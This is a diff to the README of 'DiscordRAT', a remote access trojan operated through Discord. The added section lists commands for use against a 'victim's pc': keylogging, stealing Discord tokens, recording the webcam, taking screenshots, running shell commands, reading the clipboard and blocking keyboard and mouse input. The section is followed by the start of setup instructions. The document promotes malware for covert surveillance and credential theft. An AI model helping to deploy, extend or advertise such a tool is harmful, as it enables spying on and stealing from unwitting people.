@@ -23,6 +23,74 @@ Love ❌ code ✅
 * ` Easy to setup and use`
 * ` Up-to-date version of https://github.com/Sp00p64/DiscordRAT`
 
+### 🤖・Commands
+```
+> kill
+kills all inactive sessions
+
+> exit
+stop the program on victims pc
+
+> info
+gather info about the user
+
+> startkeylogger
+start a key logger on their pc
+
+> stopkeylogger
+stop the key logger
+
+> KeyLogDump
+dumb the keylogs
+
+> tokens
+get all their discord tokens
+
+> windowstart
+start the window logger
+
+> windowstop
+stop window logger
+
+> webcam
+takes a video of their webcam
+
+> screenshot
+take a screenshot
+
+> MaxVolume
+set their sound to max
+
+> MuteVolume
+set their sound to 0
+
+> Wallpaper
+Change their wallpaper
+
+> Shell
+run shell commands on their pc
+
+> Write
+Make the user type what ever you want
+
+> Clipboard
+get their current clipboard
+
+> AdminCheck
+check if DiscordRAT has admin perms
+
+> IdleTime
+check for how long your victim has been idle for
+
+> BlockInput
+Blocks user's keyboard and mouse
+
+> UnblockInput
+UnBlocks user's keyboard and mouse
+
+> MsgBox
+make a messagebox popup on their screen with a custom message
+```
 ### 📁・Setting up the RAT
 1. Start off by ofc installing [python](https://www.python.org/)
 2. Download the code now and open a cmd in the directory and type `pip install -r requirements.txt`
